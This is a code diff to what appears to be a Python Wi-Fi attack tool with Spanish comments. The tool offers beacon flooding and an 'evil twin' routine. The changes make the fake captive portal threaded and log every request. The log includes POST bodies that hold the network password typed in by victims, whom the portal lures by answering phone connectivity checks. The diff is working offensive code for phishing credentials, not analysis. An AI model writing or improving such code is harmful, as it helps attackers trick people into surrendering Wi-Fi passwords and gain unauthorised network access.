@@ -468,6 +468,21 @@ def beacon_flood(iface, channel=6, seconds=20, pps=80, realistic=True):
 # gemelo. El portal corre en :8080 (no-root) y se redirige el :80 con iptables.
 _ET_STATE = {"ssid": None, "password": None}
 _ET_EVENT = threading.Event()
+_ET_LOG = {"path": None}
+
+def _et_log(msg):
+    p = _ET_LOG.get("path")
+    if not p:
+        return
+    try:
+        with open(p, "a") as f:
+            f.write(f"[{time.strftime('%H:%M:%S')}] PORTAL {msg}\n")
+    except Exception:
+        pass
+
+class _ETServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
+    allow_reuse_address = True
+    daemon_threads = True
 
 class _ETPortalHandler(http.server.BaseHTTPRequestHandler):
     def log_message(self, *a):
@@ -499,6 +514,7 @@ class _ETPortalHandler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
         # Captive portal: cualquier URL devuelve el portal (y responde a los
         # chequeos de conectividad de Android/iOS para disparar el "iniciar sesion").
+        _et_log(f"GET {self.path} host={self.headers.get('Host')}")
         self._send_portal()
 
     def do_POST(self):
@@ -507,8 +523,10 @@ class _ETPortalHandler(http.server.BaseHTTPRequestHandler):
             body = self.rfile.read(length).decode("utf-8", "replace")
             params = urllib.parse.parse_qs(body)
             pw = (params.get("password") or [""])[0].strip()
-        except Exception:
+        except Exception as e:
+            body = f"(error {e})"
             pw = ""
+        _et_log(f"POST {self.path} body={body[:120]!r} pw={'SI' if pw else 'no'}")
         if pw:
             _ET_STATE["password"] = pw
             _ET_EVENT.set()
@@ -624,6 +642,7 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
         logf = open(logpath, "w")
     except Exception:
         logf = open(os.devnull, "w")
+    _ET_LOG["path"] = logpath   # el handler del portal apendea GET/POST aqui
 
     def log(msg):
         try:
@@ -681,10 +700,9 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
 
         # portal cautivo en :8080
         try:
-            socketserver.TCPServer.allow_reuse_address = True
-            httpd = socketserver.TCPServer(("0.0.0.0", 8080), _ETPortalHandler)
+            httpd = _ETServer(("0.0.0.0", 8080), _ETPortalHandler)
             threading.Thread(target=httpd.serve_forever, daemon=True).start()
-            log("portal :8080 arriba")
+            log("portal :8080 arriba (threading)")
         except Exception as e:
             log(f"portal :8080 FALLO: {e}")
 
